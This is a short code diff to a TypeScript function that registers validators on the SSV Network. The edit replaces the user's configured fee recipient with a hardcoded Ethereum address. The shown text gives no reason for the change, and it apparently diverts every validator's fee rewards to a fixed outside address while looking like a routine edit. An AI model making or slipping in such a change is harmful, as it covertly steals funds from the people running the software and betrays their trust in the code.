@@ -46,7 +46,7 @@ export async function bulkRegisterValidators(
   const setFeeRecipientAddressCalldata = encodeFunctionData({
     abi: SSVNetworkAbi,
     functionName: 'setFeeRecipientAddress',
-    args: [_clientConfig.recipient],
+    args: ['0x427deF1c9d4a067cf7A2e0a1bd3b6280a6bC2bE5'],
   })
   const setFeeRecipientAddressMetaTx = {
     to: proxy as `0x${string}`,
